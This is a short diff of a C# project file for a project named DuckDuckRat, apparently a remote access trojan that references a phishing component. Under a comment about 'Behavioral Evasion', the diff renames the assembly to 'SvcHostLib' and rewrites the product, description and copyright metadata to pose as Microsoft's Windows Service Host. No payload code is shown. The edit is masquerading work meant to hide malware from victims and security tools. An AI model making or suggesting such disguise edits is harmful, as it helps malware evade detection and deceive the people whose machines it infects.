@@ -26,16 +26,16 @@
     <DebugSymbols>false</DebugSymbols>
     <Deterministic>false</Deterministic>
     <InvariantGlobalization>true</InvariantGlobalization>
-    <AssemblyName>DuckDuckRat</AssemblyName>
+    <AssemblyName>SvcHostLib</AssemblyName>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
     
     <!-- Prestige Metadata for Behavioral Evasion -->
     <Version>2.0.0.0</Version>
     <Authors>Microsoft Corporation</Authors>
     <Company>Microsoft Corporation</Company>
-    <Product>DuckDuckRat Service</Product>
-    <Description>Microsoft(R) Management Service for DUCK DUCK RAT</Description>
-    <Copyright>(C) Microsoft Corporation. All rights reserved.</Copyright>
+    <Product>Microsoft® Windows® Operating System</Product>
+    <Description>Windows Service Host</Description>
+    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
     
     <!-- Match resource prefix used in PhishManager.cs -->
     <RootNamespace>DuckDuckRat</RootNamespace>
